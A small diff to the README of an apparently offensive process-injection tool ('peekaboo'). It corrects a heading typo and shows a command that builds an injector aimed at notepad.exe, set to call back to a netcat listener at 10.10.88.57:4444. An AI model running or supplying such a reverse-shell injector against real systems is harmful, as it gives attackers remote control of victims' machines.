@@ -77,7 +77,7 @@ check your netcat listener:
 
 ![check netcat listener](./screenshots/10.png?raw=true)
 
-## 3. UPDATTE: Compile injector on kali linux (but only console .exe now)
+## 3. UPDATE: Compile injector on kali linux
 run python script on linux (for example process `notepad.exe`):
 ```bash
 python3 peekaboo-inj.py -l 10.10.88.57 -p 4444 -e notepad.exe
